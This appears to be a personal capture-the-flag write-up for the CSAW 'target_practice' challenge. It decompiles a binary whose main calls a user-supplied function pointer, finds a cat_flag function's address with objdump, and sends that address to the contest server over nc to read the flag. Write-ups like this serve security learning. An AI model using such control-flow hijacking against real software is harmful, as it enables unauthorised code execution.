---
Source: 
created: 2023-09-16
tags: ctf writeup
Type: "[[Fleeting notes]]"
---
### Description:
```
Aim carefully... This pwnie can JUMP!
```
### File:
![[target_practice]]
### Solution:
After using file command:
```
target_practice: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c2ae3c4733d9761d5043faa90d68371e52d74bc2, not stripped
```
not stripped. Great!
Opened it with gdb.
After running it, it wants only one input and then it breaks.
After opening it with Ghidra we get inside the  main function:
```c++

int main(void)

{
  long in_FS_OFFSET;
  code *local_20;
  code *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  fflush(stdout);
  fflush(stdin);
  printf("Aim carefully.... ");
  __isoc99_scanf(&DAT_00400895,&local_20);
  local_18 = local_20;
  (*local_20)();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
As, `code *local_20;` is a code pointer, and `__isoc99_scanf(&DAT_00400895,&local_20);` is taking input so, I deduced that it must be taking an function pointer.
After searching in Ghidra, I found this function,
```cpp
void cat_flag(void)

{
  system("cat /flag.txt");
  return;
}
```
After using the objdump command with grep we get:
command:
```bash
objdump -D target_practice  | grep "cat"
```
Output:
```
0000000000400660 <_dl_relocate_static_pie>:
0000000000400717 <cat_flag>:
```

So, I found out the function pointer.
Now, time to test.
After using the pointer, I see that it doesn't give segmentation error.
Finally, time to test it on the server.
```bash
nc intro.csaw.io 31138
Aim carefully.... 400717
```
Output:
```
csawctf{y0ure_a_m4s7er4im3r}
```
We got our flag. Yay!